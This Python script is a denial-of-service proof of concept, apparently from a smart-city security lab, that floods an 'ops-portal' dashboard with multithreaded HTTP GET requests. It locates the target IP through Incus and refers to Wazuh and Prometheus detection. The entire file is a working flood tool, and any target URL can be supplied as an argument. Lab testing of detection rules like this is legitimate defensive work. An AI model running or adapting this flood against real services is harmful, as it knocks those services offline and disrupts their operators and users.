#!/usr/bin/env python3
"""
Threat 1 PoC: DDoS attack against the ops-portal web dashboard.
Sends a flood of HTTP GET requests from multiple threads to overwhelm the service.

Run from the Debian VM — the script auto-detects the smartcity-services Incus IP.

Usage:
    python3 poc/ddos_attack.py [--target http://<ip>:5600] [--threads 20] [--duration 60]
"""
import argparse
import subprocess
import threading
import time
import urllib.request
import urllib.error
from datetime import datetime


def _incus_ip(container="smartcity-services"):
    """Return the IPv4 of an Incus container, or None if not found."""
    try:
        out = subprocess.check_output(
            ["incus", "list", container, "-f", "csv", "-c", "4"],
            stderr=subprocess.DEVNULL, text=True,
        ).strip()
        # Output: "10.166.11.2 (eth0)\n..."
        return out.splitlines()[0].split()[0]
    except Exception:
        return None


_ip = _incus_ip()
_default_target = f"http://{_ip}:5600" if _ip else "http://localhost:5600"

parser = argparse.ArgumentParser(description="DDoS PoC — ops-portal flood")
parser.add_argument("--target", default=_default_target, help="Target URL")
parser.add_argument("--threads", type=int, default=20, help="Number of threads")
parser.add_argument("--duration", type=int, default=60, help="Attack duration (seconds)")
args = parser.parse_args()

requests_sent = 0
errors = 0
lock = threading.Lock()
stop_event = threading.Event()


def flood_worker():
    global requests_sent, errors
    while not stop_event.is_set():
        try:
            urllib.request.urlopen(args.target, timeout=2)
            with lock:
                requests_sent += 1
        except Exception:
            with lock:
                errors += 1


def print_stats():
    start = time.time()
    while not stop_event.is_set():
        time.sleep(5)
        elapsed = time.time() - start
        with lock:
            rate = requests_sent / max(elapsed, 1)
        print(f"[{datetime.now().strftime('%H:%M:%S')}] Sent={requests_sent} Errors={errors} Rate={rate:.1f}/s")


print(f"[*] DDoS PoC — target: {args.target}")
print(f"[*] {args.threads} threads for {args.duration}s")
print(f"[*] Detection: Wazuh rule 100002 (50+ req/10s from same IP)")

threads = [threading.Thread(target=flood_worker, daemon=True) for _ in range(args.threads)]
threads.append(threading.Thread(target=print_stats, daemon=True))
for t in threads:
    t.start()

time.sleep(args.duration)
stop_event.set()

print(f"\n[+] Attack finished. Sent={requests_sent} Errors={errors}")
print(f"[+] Prometheus: rate(http_requests_total{{job='ops-portal'}}[10s])")
print(f"[+] Wazuh:      rule 100002 — DDoS detected")
